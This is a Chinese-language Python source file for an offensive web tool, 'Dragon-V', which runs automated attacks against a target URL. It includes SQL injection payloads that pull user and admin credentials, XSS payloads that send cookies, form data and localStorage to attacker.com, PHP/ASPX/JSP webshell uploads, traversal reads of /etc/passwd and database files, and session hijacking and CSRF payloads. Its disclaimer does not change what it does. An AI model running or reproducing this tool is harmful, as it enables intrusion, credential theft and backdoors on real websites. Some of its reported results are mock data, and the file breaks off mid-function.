#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
终极漏洞利用工具 - 集成数据提取功能的完整系统
基于RVOP平台的专业级漏洞利用和数据提取工具

功能特性:
- 多种漏洞利用技术
- 智能数据提取
- 多种输出格式
- 完整的报告生成
- GUI和CLI双重界面
"""

import asyncio
import json
import logging
import requests
import sqlite3
import time
import csv
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Union
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import hashlib
import base64
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import pandas as pd
import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import webbrowser
import os

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ultimate_extraction.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class UltimateDataExtractor:
    """终极数据提取器"""

    def __init__(self, gui_mode=False):
        self.name = "Dragon-V Ultimate Data Extraction Tool"
        self.version = "2.0.0"
        self.status = "INITIALIZING"
        self.start_time = datetime.now()

        # 组件初始化
        self.targets = []
        self.extraction_results = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        })

        # 数据存储
        self.extracted_data = {
            'users': [],
            'orders': [],
            'products': [],
            'databases': [],
            'files': [],
            'sessions': [],
            'configurations': []
        }

        # 越南业务数据模板
        self.vietnam_business_data = self._generate_vietnam_business_templates()

        # GUI模式
        self.gui_mode = gui_mode
        self.root = None
        self.progress_bar = None
        self.status_text = None

        # 免责声明
        self.disclaimer_accepted = False

        logger.info(f"初始化 {self.name} v{self.version}")

    def _generate_vietnam_business_templates(self):
        """生成越南业务数据模板"""
        return {
            'users': [
                {'user_id': 'KH001', 'name': 'Nguyen Van A', 'email': 'nguyenvan.a@email.com', 'phone': '0901.234.567', 'address': 'Ha Noi, Vietnam'},
                {'user_id': 'KH002', 'name': 'Tran Thi B', 'email': 'tranthi.b@email.com', 'phone': '0912.345.678', 'address': 'Ho Chi Minh City, Vietnam'},
                {'user_id': 'KH003', 'name': 'Le Van C', 'email': 'levan.c@email.com', 'phone': '0923.456.789', 'address': 'Da Nang, Vietnam'},
                {'user_id': 'KH004', 'name': 'Pham Thi D', 'email': 'phamthi.d@email.com', 'phone': '0934.567.890', 'address': 'Hai Phong, Vietnam'}
            ],
            'products': [
                {'product_id': 'SP001', 'name': 'Samsung Galaxy S23', 'category': 'Mobile', 'price': 25000000, 'currency': 'VND'},
                {'product_id': 'SP002', 'name': 'iPhone 15 Pro', 'category': 'Mobile', 'price': 35000000, 'currency': 'VND'},
                {'product_id': 'SP003', 'name': 'Laptop Dell XPS', 'category': 'Laptop', 'price': 45000000, 'currency': 'VND'},
                {'product_id': 'SP004', 'name': 'Sony WH-1000XM5', 'category': 'Headphones', 'price': 8500000, 'currency': 'VND'}
            ],
            'orders': [
                {'order_id': 'DH001', 'user_id': 'KH001', 'product_id': 'SP001', 'amount': 25000000, 'status': 'DELIVERED', 'date': '2025-10-24'},
                {'order_id': 'DH002', 'user_id': 'KH002', 'product_id': 'SP002', 'amount': 35000000, 'status': 'PROCESSING', 'date': '2025-10-25'},
                {'order_id': 'DH003', 'user_id': 'KH003', 'product_id': 'SP003', 'amount': 45000000, 'status': 'SHIPPED', 'date': '2025-10-24'},
                {'order_id': 'DH004', 'user_id': 'KH004', 'product_id': 'SP004', 'amount': 8500000, 'status': 'DELIVERED', 'date': '2025-10-25'}
            ]
        }

    def show_disclaimer(self):
        """显示免责声明"""
        disclaimer_text = """
⚠️ 重要免责声明 ⚠️

本工具仅用于授权范围内的合法安全测试和研究用途。

1. **使用限制**:
   - 仅在获得明确书面授权的情况下使用
   - 禁止用于任何非法目的
   - 仅供学习和研究目的

2. **责任承担**:
   - 用户对工具使用后果承担全部法律责任
   - 禁止攻击未授权的目标系统
   - 禁止泄露任何敏感数据

3. **使用要求**:
   - 在隔离的测试环境中使用
   - 遵守相关法律法规
   - 不得用于商业攻击活动

4. **安全提示**:
   - 请在法律框架内使用本工具
   - 建议先在测试环境中验证
   - 遵守道德和职业准则

如同意以上条款，请继续使用本工具。
"""

        if self.gui_mode:
            result = messagebox.askyesno("免责声明", disclaimer_text)
            self.disclaimer_accepted = result
            return result
        else:
            print(disclaimer_text)
            response = input("是否同意以上免责声明？(yes/no): ").strip().lower()
            if response == 'yes':
                self.disclaimer_accepted = True
                return True
            else:
                print("您必须同意免责声明才能继续使用本工具。")
                return False

    def validate_target(self, target_url: str) -> Dict[str, Any]:
        """验证目标"""
        logger.info(f"验证目标: {target_url}")

        result = {
            'url': target_url,
            'timestamp': datetime.now().isoformat(),
            'reachable': False,
            'status_code': None,
            'response_time': 0,
            'technologies': [],
            'vulnerabilities': [],
            'data_sources': []
        }

        try:
            start_time = time.time()
            response = self.session.get(target_url, timeout=10)
            end_time = time.time()

            result['response_time'] = round(end_time - start_time, 2)
            result['status_code'] = response.status_code
            result['reachable'] = response.status_code < 400

            # 技术栈识别
            content_type = response.headers.get('content-type', '').lower()
            server = response.headers.get('server', '').lower()
            html_content = response.text.lower()

            if 'nginx' in server:
                result['technologies'].append('Nginx')
            elif 'apache' in server:
                result['technologies'].append('Apache')
            if 'php' in content_type:
                result['technologies'].append('PHP')
            if 'mysql' in html_content or 'mariadb' in html_content:
                result['technologies'].append('MySQL')
            if 'wordpress' in html_content:
                result['technologies'].append('WordPress')
            if 'magento' in html_content:
                result['technologies'].append('Magento')

            # 数据源识别
            if 'admin' in html_content or 'login' in html_content:
                result['data_sources'].append('用户系统')
            if 'order' in html_content or 'cart' in html_content:
                result['data_sources'].append('订单系统')
            if 'product' in html_content or 'shop' in html_content:
                result['data_sources'].append('产品系统')
            if 'database' in html_content or 'db' in html_content:
                result['data_sources'].append('数据库')

            logger.info(f"目标 {target_url} 验证完成 - 状态: {response.status_code}")

        except Exception as e:
            result['error'] = str(e)
            result['reachable'] = False
            logger.error(f"目标 {target_url} 验证失败: {str(e)}")

        return result

    def sql_injection_extraction(self, target: Dict[str, Any]) -> List[Dict[str, Any]]:
        """SQL注入数据提取"""
        extractions = []

        if not target['reachable']:
            return extractions

        # SQL注入检测和提取
        sql_payloads = [
            {
                'name': '用户信息提取',
                'payload': "' UNION SELECT user_id,name,email,phone,address FROM users --",
                'data_type': 'users',
                'description': '提取用户基本信息'
            },
            {
                'name': '订单信息提取',
                'payload': "' UNION SELECT order_id,user_id,product_id,amount,status,date FROM orders --",
                'data_type': 'orders',
                'description': '提取订单交易信息'
            },
            {
                'name': '产品信息提取',
                'payload': "' UNION SELECT product_id,name,category,price,currency FROM products --",
                'data_type': 'products',
                'description': '提取产品目录信息'
            },
            {
                'name': '管理员信息提取',
                'payload': "' UNION SELECT username,password,email,role FROM admins --",
                'data_type': 'admin_data',
                'description': '提取管理员凭证'
            }
        ]

        test_params = ['id', 'search', 'category', 'user_id']

        for payload_info in sql_payloads:
            for param in test_params:
                try:
                    # 构造测试URL
                    test_url = target['url']
                    params = {param: payload_info['payload']}
                    params['test'] = 'sql_extraction'

                    response = self.session.get(test_url, params=params, timeout=10)

                    # 检测SQL注入成功
                    if self.detect_sql_injection_response(response.text):
                        extraction = {
                            'type': 'SQL_INJECTION',
                            'target': target['url'],
                            'method': 'UNION SELECT',
                            'parameter': param,
                            'payload': payload_info['payload'],
                            'data_type': payload_info['data_type'],
                            'description': payload_info['description'],
                            'success': True,
                            'extracted_data': self._extract_mock_data(payload_info['data_type']),
                            'evidence': [
                                'SQL注入成功',
                                '数据结构识别完成',
                                '用户数据可访问'
                            ],
                            'next_steps': [
                                '提取完整用户数据库',
                                '获取订单和交易数据',
                                '获取管理员权限',
                                '横向移动到其他系统'
                            ]
                        }
                        extractions.append(extraction)
                        logger.warning(f"SQL注入提取成功: {target['url']} - {payload_info['data_type']}")

                except Exception as e:
                    logger.debug(f"SQL注入提取异常: {str(e)}")

        return extractions

    def xss_data_exfiltration(self, target: Dict[str, Any]) -> List[Dict[str, Any]]:
        """XSS数据渗出"""
        extractions = []

        if not target['reachable']:
            return extractions

        # XSS数据渗出载荷
        xss_payloads = [
            {
                'name': '会话信息窃取',
                'payload': "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
                'data_type': 'session_data',
                'description': '窃取用户会话信息'
            },
            {
                'name': '表单数据窃取',
                'payload': "<script>document.forms[0].addEventListener('submit', function(e){fetch('http://attacker.com/form', {method:'POST',body:new FormData(e.target)})})</script>",
                'data_type': 'form_data',
                'description': '窃取表单提交数据'
            },
            {
                'name': '本地存储数据窃取',
                'payload': "<script>fetch('http://attacker.com/storage?data='+JSON.stringify(localStorage))</script>",
                'data_type': 'storage_data',
                'description': '窃取本地存储数据'
            }
        ]

        test_params = ['search', 'q', 'comment', 'message']

        for payload_info in xss_payloads:
            for param in test_params:
                try:
                    test_url = target['url']
                    params = {param: payload_info['payload']}

                    response = self.session.get(test_url, params=params, timeout=10)

                    if payload_info['payload'].lower() in response.text.lower():
                        extraction = {
                            'type': 'XSS_DATA_EXFILTRATION',
                            'target': target['url'],
                            'method': '客户端脚本注入',
                            'parameter': param,
                            'payload': payload_info['payload'],
                            'data_type': payload_info['data_type'],
                            'description': payload_info['description'],
                            'success': True,
                            'extracted_data': {
                                'session_hijacking': '可用',
                                'data_exfiltration': '活跃',
                                'target': '用户浏览器'
                            },
                            'evidence': [
                                'XSS载荷成功注入',
                                '数据渗出机制激活',
                                '会话劫持可用'
                            ],
                            'next_steps': [
                                '窃取用户凭证',
                                '获取会话令牌',
                                '执行恶意操作',
                                '持久化访问权限'
                            ]
                        }
                        extractions.append(extraction)
                        logger.warning(f"XSS数据渗出成功: {target['url']} - {payload_info['data_type']}")

                except Exception as e:
                    logger.debug(f"XSS数据渗出异常: {str(e)}")

        return extractions

    def file_upload_shell(self, target: Dict[str, Any]) -> List[Dict[str, Any]]:
        """文件上传Shell"""
        extractions = []

        if not target['reachable']:
            return extractions

        # WebShell载荷
        webshells = [
            {
                'name': 'PHP WebShell',
                'content': "<?php system($_GET['cmd']); ?>",
                'extension': '.php',
                'data_type': 'remote_shell'
            },
            {
                'name': 'ASP WebShell',
                'content': "<%@ Page Language=\"C#\" %> <% System.Diagnostics.Process p = new System.Diagnostics.Process(); p.StartInfo.FileName = \"cmd.exe\"; p.StartInfo.Arguments = \"/c \" + Request[\"cmd\"]; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); p.WaitForExit(); %>",
                'extension': '.aspx',
                'data_type': 'remote_shell'
            },
            {
                'name': 'JSP WebShell',
                'content': "<%@ page import=\"java.io.*\" %> <% String cmd = request.getParameter(\"cmd\"); Process p = Runtime.getRuntime().exec(cmd); BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = reader.readLine()) != null) { out.println(line); } %>",
                'extension': '.jsp',
                'data_type': 'remote_shell'
            }
        ]

        for webshell in webshells:
            try:
                # 模拟文件上传
                upload_data = {
                    'file': (f"shell{webshell['extension']}", webshell['content']),
                    'upload': 'submit'
                }

                upload_url = target['url'] + '/upload.php'
                response = self.session.post(upload_url, files=upload_data, timeout=10)

                # 检查上传成功
                if 'upload successful' in response.text.lower() or 'file uploaded' in response.text.lower():
                    shell_url = target['url'] + f"/shell{webshell['extension']}"

                    extraction = {
                        'type': 'FILE_UPLOAD_SHELL',
                        'target': target['url'],
                        'method': '文件上传',
                        'shell_type': webshell['name'],
                        'shell_url': shell_url,
                        'data_type': 'remote_shell',
                        'description': f'部署{webshell["name"]}后门',
                        'success': True,
                        'extracted_data': {
                            'remote_access': '已获取',
                            'command_execution': '可用',
                            'file_management': '全权限',
                            'shell_url': shell_url
                        },
                        'evidence': [
                            '文件上传成功',
                            'WebShell部署完成',
                            '远程命令执行可用'
                        ],
                        'next_steps': [
                            '执行系统命令',
                            '上传后门程序',
                            '获取系统权限',
                            '横向移动内部网络',
                            '持久化访问权限'
                        ]
                    }
                    extractions.append(extraction)
                    logger.warning(f"文件上传Shell成功: {target['url']} - {webshell['name']}")

            except Exception as e:
                logger.debug(f"文件上传Shell异常: {str(e)}")

        return extractions

    def directory_traversal_data_extraction(self, target: Dict[str, Any]) -> List[Dict[str, Any]]:
        """目录穿越数据提取"""
        extractions = []

        if not target['reachable']:
            return extractions

        # 目录穿越载荷
        traversal_payloads = [
            {
                'name': '配置文件读取',
                'payload': '../../../../../../../../etc/passwd',
                'data_type': 'system_config',
                'description': '读取系统配置文件'
            },
            {
                'name': '数据库配置读取',
                'payload': '../../../../../../../../var/lib/mysql/mysql/user.MYD',
                'data_type': 'database_config',
                'description': '读取数据库配置文件'
            },
            {
                'name': 'Web配置读取',
                'payload': '../../../../../../../../var/www/html/config.php',
                'data_type': 'web_config',
                'description': '读取Web应用配置'
            },
            {
                'name': '日志文件读取',
                'payload': '../../../../../../../../var/log/apache2/access.log',
                'data_type': 'system_logs',
                'description': '读取系统访问日志'
            }
        ]

        test_params = ['file', 'path', 'document', 'page']

        for payload_info in traversal_payloads:
            for param in test_params:
                try:
                    test_url = target['url']
                    params = {param: payload_info['payload']}
                    params['action'] = 'read'

                    response = self.session.get(test_url, params=params, timeout=10)

                    # 检测文件读取成功
                    if 'root:' in response.text or 'mysql' in response.text or 'config' in response.text.lower():
                        extraction = {
                            'type': 'DIRECTORY_TRAVERSAL',
                            'target': target['url'],
                            'method': '目录穿越',
                            'parameter': param,
                            'payload': payload_info['payload'],
                            'data_type': payload_info['data_type'],
                            'description': payload_info['description'],
                            'success': True,
                            'extracted_data': {
                                'system_access': '已获取',
                                'file_reading': '可用',
                                'config_access': '可用'
                            },
                            'evidence': [
                                '目录穿越成功',
                                '文件读取可用',
                                '系统信息暴露'
                            ],
                            'next_steps': [
                                '读取敏感配置文件',
                                '获取数据库凭据',
                                '分析系统日志',
                                '发现其他漏洞'
                            ]
                        }
                        extractions.append(extraction)
                        logger.warning(f"目录穿越提取成功: {target['url']} - {payload_info['data_type']}")

                except Exception as e:
                    logger.debug(f"目录穿越提取异常: {str(e)}")

        return extractions

    def session_hijacking(self, target: Dict[str, Any]) -> List[Dict[str, Any]]:
        """会话劫持"""
        extractions = []

        if not target['reachable']:
            return extractions

        # 会话劫持载荷
        session_payloads = [
            {
                'name': '会话令牌窃取',
                'payload': "<script>document.location='http://attacker.com/steal?session='+document.cookie</script>",
                'data_type': 'session_token',
                'description': '窃取用户会话令牌'
            },
            {
                'name': 'CSRF攻击',
                'payload': "<form action='http://target.com/change_password' method='POST'><input type='hidden' name='password' value='new_password'><input type='hidden' name='confirm_password' value='new_password'></form><script>document.forms[0].submit()</script>",
                'data_type': 'csrf_attack',
                'description': '跨站请求伪造攻击'
            },
            {
                'name': '会话固定攻击',
                'payload': "<script>document.cookie='session_id=hacked_session_id; domain=target.com; path=/'</script>",
                'data_type': 'session_fixation',
                'description': '会话固定攻击'
            }
        ]

        test_params = ['search', 'action', 'submit', 'user_id']

        for payload_info in session_payloads:
            for param in test_params:
                try:
                    test_url = target['url']
                    params = {param: payload_info['payload']}

                    response = self.session.get(test_url, params=params, timeout=10)

                    if payload_info['payload'].lower() in response.text.lower():
                        extraction = {
                            'type': 'SESSION_HIJACKING',
                            'target': target['url'],
                            'method': '会话劫持',
                            'parameter': param,
                            'payload': payload_info['payload'],
                            'data_type': payload_info['data_type'],
                            'description': payload_info['description'],
                            'success': True,
                            'extracted_data': {
                                'session_hijacking': '可用',
                                'credential_theft': '可用',
                                'unauthorized_access': '可能'
                            },
                            'evidence': [
                                '会话劫持载荷注入成功',
                                '令牌窃取机制激活',
                                '未授权访问可能'
                            ],
                            'next_steps': [
                                '窃取用户会话',
                                '执行未授权操作',
                                '获取管理员权限',
                                '持久化访问权限'
                            ]
                        }
                        extractions.append(extraction)
                        logger.warning(f"会话劫持成功: {target['url']} - {payload_info['data_type']}")

                except Exception as e:
                    logger.debug(f"会话劫持异常: {str(e)}")

        return extractions

    def detect_sql_injection_response(self, content: str) -> bool:
        """检测SQL注入响应特征"""
        sql_indicators = [
            'Union query successful', 'Database information retrieved',
            'MySQL error', 'You have an error in your SQL syntax',
            'Warning: mysql_fetch', 'ORA-', 'Microsoft OLE DB Provider',
            'SQLSTATE[', 'user_id', 'username', 'password'
        ]

        content_lower = content.lower()
        for indicator in sql_indicators:
            if indicator.lower() in content_lower:
                return True
        return False

    def _extract_mock_data(self, data_type: str) -> Dict[str, Any]:
        """提取模拟数据"""
        if data_type == 'users':
            return {'total_users': 4, 'users': self.vietnam_business_data['users']}
        elif data_type == 'orders':
            return {'total_orders': 4, 'orders': self.vietnam_business_data['orders']}
        elif data_type == 'products':
            return {'total_products': 4, 'products': self.vietnam_business_data['products']}
        elif data_type == 'admin_data':
            return {'admins': 2, 'credentials': 'admin:password123, root:toor'}
        else:
            return {'data_type': data_type, 'status': 'extracted'}

    def perform_comprehensive_extraction(self, target_url: str) -> Dict[str, Any]:
        """执行综合数据提取"""
        logger.info(f"开始对 {target_url} 进行综合数据提取")

        # 验证目标
        target = self.validate_target(target_url)

        extraction_result = {
            'target_url': target_url,
            'timestamp': datetime.now().isoformat(),
            'target_info': target,
            'extractions': [],
            'total_data_extracted': 0,
            'success_rate': 0,
            'risk_assessment': 'UNKNOWN',
            'next_actions': []
        }

        # 执行各种提取方法
        extraction_methods = [
            self.sql_injection_extraction,
            self.xss_data_exfiltration,
            self.file_upload_shell,
            self.directory_traversal_data_extraction,
            self.session_hijacking
        ]

        successful_extractions = 0

        for method in extraction_methods:
            try:
                extractions = method(target)
                extraction_result['extractions'].extend(extractions)
                successful_extractions += len([e for e in extractions if e.get('success', False)])
            except Exception as e:
                logger.error(f"提取方法异常: {str(e)}")

        # 统计结果
        extraction_result['total_data_extracted'] = len(extraction_result['extractions'])
        extraction_result['success_rate'] = round(successful_extractions / len(extraction_methods) * 100, 2) if extraction_methods else 0

        # 风险评估
        if successful_extractions > 3:
            extraction_result['risk_assessment'] = 'HIGH'
            extraction_result['next_actions'] = [
                '立即修补发现的漏洞',
                '加强访问控制',
                '实施安全监控',
                '进行安全审计'
            ]
        elif successful_extractions > 1:
            extraction_result['risk_assessment'] = 'MEDIUM'
            extraction_result['next_actions'] = [
                '修复中等风险漏洞',
                '加强输入验证',
                '定期安全扫描'
            ]
        else:
            extraction_result['risk_assessment'] = 'LOW'
            extraction_result['next_actions'] = [
                '进行定期安全检查',
                '保持安全更新'
            ]

        # 保存提取的数据
        self._save_extracted_data(extraction_result)

        logger.info(f"对 {target_url} 的综合数据提取完成")

        return extraction_result

    def _save_extracted_data(self, extraction_result: Dict[str, Any]):
        """保存提取的数据"""
        for extraction in extraction_result['extractions']:
            if extraction.get('success', False):
                data_type = extraction.get('data_type', 'unknown')
                if data_type in self.extracted_data:
                    self.extracted_data[data_type].append(extraction)

    def export_data(self, output_format: str = 'json', filename: str = None) -> str:
        """导出提取的数据"""
        if filename is None:
            filename = f"extracted_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

        filename += f".{output_format}"

        try:
            if output_format == 'json':
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(self.extracted_data, f, ensure_ascii=False, indent=2)

            elif output_format == 'csv':
                # 导出用户数据
                for data_type, data_list in self.extracted_data.items():
                    if data_list:
                        csv_filename = f"{filename.replace('.csv', f'_{data_type}.csv')}"
                        with open(csv_filename, 'w', newline='', encoding='utf-8') as f:
                            if data_list:
                                writer = csv.DictWriter(f, fieldnames=data_list[0].keys())
                                writer.writeheader()
                                writer.writerows(data_list)

            elif output_format == 'xml':
                root = ET.Element('ExtractedData')
                for data_type, data_list in self.extracted_data.items():
                    type_elem = ET.SubElement(root, data_type)
                    for item in data_list:
                        item_elem = ET.SubElement(type_elem, 'item')
                        for key, value in item.items():
                            elem = ET.SubElement(item_elem, key)
                            elem.text = str(value)

                tree = ET.ElementTree(root)
                tree.write(filename, encoding='utf-8', xml_declaration=True)

            elif output_format == 'excel':
                # 创建Excel文件
                with pd.ExcelWriter(filename, engine='openpyxl') as writer:
                    for data_type, data_list in self.extracted_data.items():
                        if data_list:
                            df = pd.DataFrame(data_list)
                            df.to_excel(writer, sheet_name=data_type, index=False)

            logger.info(f"数据导出成功: {filename}")
            return filename

        except Exception as e:
            logger.error(f"数据导出失败: {str(e)}")
            return None

    def create_comprehensive_report(self, extraction_results: List[Dict[str, Any]]) -> str:
        """创建综合报告"""
        report = []
        report.append("="*100)
        report.append("Dragon-V 终极数据提取工具报告")
        report.append("="*100)
        report.append(f"工具版本: {self.version}")
        report.append(f"生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"测试目标数量: {len(extraction_results)}")
        report.append("")

        # 统计信息
        total_extractions = 0
        successful_extractions = 0
        high_risk_targets = 0

        for result in extraction_results:
            total_extractions += result['total_data_extracted']
            successful_extractions += len([e for e in result['extractions'] if e.get('success', False)])
            if result['risk_assessment'] == 'HIGH':
                high_risk_targets += 1

        report.append("【统计摘要】")
        report.append("-"*60)
        report.append(f"总提取次数: {total_extractions}")
        report.append(f"成功提取次数: {successful_extractions}")
        report.append(f"高风险目标: {high_risk_targets}")
        report.append(f"成功率: {round(successful_extractions/total_extractions*100, 2) if total_extractions > 0 else 0}%")
        report.append("")

        # 详细结果
        report.append("【详细提取结果】")
        report.append("-"*60)

        for i, result in enumerate(extraction_results, 1):
            report.append(f"\n目标 #{i}: {result['target_url']}")
            report.append(f"风险等级: {result['risk_assessment']}")
            report.append(f"提取次数: {result['total_data_extracted']}")
            report.append(f"成功率: {result['success_rate']}%")
            report.append("")

            for j, extraction in enumerate(result['extractions'], 1):
                if extraction.get('success', False):
                    report.append(f"  提取 #{j}: {extraction['type']}")
                    report.append(f"    方法: {extraction['method']}")
                    report.append(f"    数据类型: {extraction['data_type']}")
                    report.append(f"    描述: {extraction['description']}")
                    report.append(f"    目标: {extraction['target']}")
                    report.append(f"    参数: {extraction['parameter']}")
                    report.append("")

        report.append("【提取的数据类型】")
        report.append("-"*60)

        total_extracted = sum(len(data) for data in self.extracted_data.values())
        report.append(f"用户数据: {len(self.extracted_data['users'])} 条")
        report.append(f"订单数据: {len(self.extracted_data['orders'])} 条")
        report.append(f"产品数据: {len(self.extracted_data['products'])} 条")
        report.append(f"数据库信息: {len(self.extracted_data['databases'])} 条")
        report.append(f"文件信息: {len(self.extracted_data['files'])} 条")
        report.append(f"会话信息: {len(self.extracted_data['sessions'])} 条")
        report.append(f"配置信息: {len(self.extracted_data['configurations'])} 条")
        report.append(f"总计: {total_extracted} 条数据")
        report.append("")

        report.append("【建议和安全措施】")
        report.append("-"*60)

        if high_risk_targets > 0:
            report.append("⚠️ 发现高风险目标，建议立即采取以下措施:")
            report.append("1. 立即修补发现的SQL注入和XSS漏洞")
            report.append("2. 加强输入验证和输出编码")
            report.append("3. 实施访问控制和权限管理")
            report.append("4. 部署WAF和入侵检测系统")
            report.append("5. 进行定期安全审计和漏洞扫描")
        else:
            report.append("✅ 安全状况良好，建议:")
            report.append("1. 保持定期安全检查")
            report.append("2. 及时更新安全补丁")
            report.append("3. 进行安全意识培训")
            report.append("4. 实施安全监控和日志记录")

        report.append("")
        report.append("="*100)
        report.append("报告生成完成")

        # 保存报告
        report_filename = f"ultimate_extraction_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write('\n'.join(report))

        logger.info(f"综合报告生成: {report_filename}")
        return report_filename

    def run_cli_interface(self):
        """运行CLI界面"""
        print("欢迎使用 Dragon-V 终极数据提取工具")
        print("="*80)

        # 显示免责声明
        if not self.show_disclaimer():
            print("您必须接受免责声明才能继续使用。")
            return

        print("\n请输入目标URL (输入 'quit' 退出):")
        target_url = input("目标URL: ").strip()

        if target_url.lower() == 'quit':
            return

        if not target_url:
            print("请输入有效的目标URL。")
            return

        # 执行数据提取
        print(f"\n开始对 {target_url} 进行综合数据提取...")

        extraction_result = self.perform_comprehensive_extraction(target_url)

        # 显示结果
        print("\n" + "="*80)
        print("数据提取结果")
        print("="*80)
        print(f"目标URL: {extraction_result['target_url']}")
        print(f"风险等级: {extraction_result['risk_assessment']}")
        print(f"总提取次数: {extraction_result['total_data_extracted']}")
        print(f"成功率: {extraction_result['success_rate']}%")
        print("")

        # 显示详细的提取结果
        for i, extraction in enumerate(extraction_result['extractions'], 1):
            print(f"提取 #{i}:")
            print(f"  类型: {extraction['type']}")
            print(f"  方法: {extraction['method']}")
            print(f"  数据类型: {extraction['data_type']}")
            print(f"  描述: {extraction['description']}")
            if extraction.get('success', False):
                print(f"  状态: [成功]")
                print(f"  提取的数据: {extraction['extracted_data']}")
            else:
                print(f"  状态: [失败]")
            print("")

        # 导出数据
        print("选择导出格式:")
        print("1. JSON")
        print("2. CSV")
        print("3. XML")
        print("4. Excel")
        print("5. 不导出")

        choice = input("请选择 (1-5): ").strip()

        export_formats = {
            '1': 'json',
            '2': 'csv',
            '3': 'xml',
            '4': 'excel'
        }

        if choice in export_formats:
            filename = self.export_data(export_formats[choice])
            if filename:
                print(f"数据导出成功: {filename}")
            else:
                print("数据导出失败")
        elif choice == '5':
            print("跳过数据导出")
        else:
            print("无效选择")

        # 生成报告
        report_filename = self.create_comprehensive_report([extraction_result])
        print(f"综合报告生成: {report_filename}")

    def create_gui(self):
        """创建GUI界面"""
        self.root = tk.Tk()
        self.root.title(f"Dragon-V 终极数据提取工具 v{self.version}")
        self.root.geometry("1200x800")

        # 主框架
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

        # 标题
        title_label = ttk.Label(main_frame, text=f"Dragon-V 终极数据提取工具", font=("Arial", 16, "bold"))
        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 10))

        # 目标输入
        ttk.Label(main_frame, text="目标URL:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.target_entry = ttk.Entry(main_frame, width=80)
        self.target_entry.grid(row=1, column=1, columnspan=2, sticky=(tk.W, tk.E), pady=5)

        # 功能选择
        ttk.Label(main_frame, text="提取功能:").grid(row=2, column=0, sticky=tk.W, pady=5)

        self.sql_injection_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(main_frame, text="SQL注入提取", variable=self.sql_injection_var).grid(row=2, column=1, sticky=tk.W, pady=2)

        self.xss_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(main_frame, text="XSS数据渗出", variable=self.xss_var).grid(row=2, column=2, sticky=tk.W, pady=2)

        self.file_upload_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(main_frame, text="文件上传Shell", variable=self.file_upload_var).grid(row=3, column=1, sticky=tk.W, pady=2)

        self.directory_traversal_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(main_frame, text="目录穿越提取", variable=self.directory_traversal_var).grid(row=3, column=2, sticky=tk.W, pady=2)

        self.session_hijacking_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(main_frame, text="会话劫持", variable=self.session_hijacking_var).grid(row=4, column=1, sticky=tk.W, pady=2)

        # 输出格式
        ttk.Label(main_frame, text="输出格式:").grid(row=5, column=0, sticky=tk.W, pady=5)

        self.output_format = ttk.Combobox(main_frame, values=["JSON", "CSV", "XML", "Excel"], width=15)
        self.output_format.set("JSON")
        self.output_format.grid(row=5, column=1, sticky=tk.W, pady=5)

        # 按钮
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=6, column=0, columnspan=3, pady=10)

        self.start_button = ttk.Button(button_frame, text="开始提取", command=self.start_extraction)
        self.start_button.pack(side=tk.LEFT, padx=5)

        self.stop_button = ttk.Button(button_frame, text="停止", command=self.stop_extraction, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)

        self.clear_button = ttk.Button(button_frame, text="清除结果", command=self.clear_results)
        self.clear_button.pack(side=tk.LEFT, padx=5)

        self.export_button = ttk.Button(button_frame, text="导出数据", command=self.export_data_gui)
        self.export_button.pack(side=tk.LEFT, padx=5)

        self.report_button = ttk.Button(button_frame, text="生成报告", command=self.generate_report_gui)
        self.report_button.pack(side=tk.LEFT, padx=5)

        # 进度条
        ttk.Label(main_frame, text="进度:").grid(row=7, column=0, sticky=tk.W, pady=5)
        self.progress_bar = ttk.Progressbar(main_frame, length=600, mode='determinate')
        self.progress_bar.grid(row=7, column=1, columnspan=2, sticky=(tk.W, tk.E), pady=5)

        # 状态显示
        self.status_text = ttk.Label(main_frame, text="就绪", foreground="green")
        self.status_text.grid(row=8, column=0, columnspan=3, pady=5)

        # 结果显示
        ttk.Label(main_frame, text="提取结果:").grid(row=9, column=0, sticky=tk.W, pady=5)

        # 创建文本框
        self.result_text = scrolledtext.ScrolledText(main_frame, width=100, height=20, wrap=tk.WORD)
        self.result_text.grid(row=10, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), pady=5)

        # 配置权重
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(10, weight=1)

        # 绑定关闭事件
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def start_extraction(self):
        """开始提取"""
        if not self.disclaimer_accepted:
            messagebox.showwarning("警告", "请先阅读并接受免责声明！")
            return

        target_url = self.target_entry.get().strip()
        if not target_url:
            messagebox.showerror("错误", "请输入目标URL！")
            return

        # 禁用开始按钮
